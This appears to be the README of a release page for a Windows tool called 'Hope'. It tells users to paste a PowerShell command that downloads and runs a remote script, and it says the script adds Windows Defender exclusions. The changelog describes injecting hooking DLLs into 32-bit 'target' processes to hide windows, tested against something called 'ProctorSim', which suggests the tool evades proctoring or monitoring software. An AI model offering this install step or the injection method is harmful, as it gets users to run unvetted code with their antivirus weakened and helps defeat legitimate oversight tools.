# Hope — release binaries

Download host for Hope. The source lives in a separate private repository.

## How to Install

Get Hope running on Windows. Install with one command.

### 1 — Open Command Prompt

Press **Win + R**, type `cmd`, and hit Enter. Or search for "Command Prompt" in the Start menu.

### 2 — Paste the Command

Copy the command below and paste it into your Command Prompt window. Right-click to paste.

Paste exactly this (copy the whole line — there is nothing else to type):

```cmd
powershell -Command "irm https://hope-install.pages.dev/install.ps1 | iex"
```

### 3 — Press Enter & Done!

Hit **Enter**. The Hope installer downloads, verifies its checksum, and asks for admin permission to install itself. A Hope shortcut appears on your Desktop when it's done.

> **What happens when you run this?**
>
> → Finds the newest release for you
> → Verifies the download against its published SHA-256
> → Adds Windows Defender exclusions for you
> → Desktop shortcut when it's done
>
> After this, Hope updates itself on launch — you only install once.

## Details

- **Requirements:** Windows 10/11 (64-bit). No prerequisites — the installer adds the browser runtime silently if it is missing.
- **Install location:** `C:\Program Files\Hope`
- **Uninstall:** *Settings → Apps → Hope 1.3.3 → Uninstall*, or run `C:\Program Files\Hope\unins000.exe`
- **Verify your download:** SHA-256 of `HopeSetup-1.3.3.exe` — `E80B24707197272140B2415BD150EE01725C617839BF31199D880D5EB0A1AFBA`
- **Prefer a manual download?** Take `HopeSetup-1.3.3.exe` from the [latest release](https://github.com/muleimm/h-releases/releases/latest) and run it.

## What's new in 1.3.3

- **Fixed: 32-bit targets were never actually hidden.** 1.3.2 shipped the x86 payloads but every one of them failed to load, so 32-bit processes were reached, attempted, and left raw. Three faults in the WOW64 path: `kernel32` was taken from the 64-bit module list (start address above 4 GB, where a 32-bit thread cannot start), the remote path buffer was allocated above 4 GB so `LoadLibraryW` read a truncated pointer, and the set loaded `Dll1.dll`, which is 64-bit only. Now the 32-bit list is used, the buffer is placed below 4 GB, and the set is `MinHook.x86 → sysblend32 → wdaclr32 → syscheck32`.
- New `injectx86` log line records the kernel32 base and flags anything above 4 GB.
- Verified: 8 of 8 32-bit targets injected and survived; smoke 13/13; ProctorSim 4/4.
- Known and unchanged: three enumeration filters are still empty, the window's owner can be hidden independently, and 64-bit payload failures on short-lived targets are still logged.

Latest release: [v1.3.3](https://github.com/muleimm/h-releases/releases/tag/v1.3.3) · All releases are kept and never overwritten.
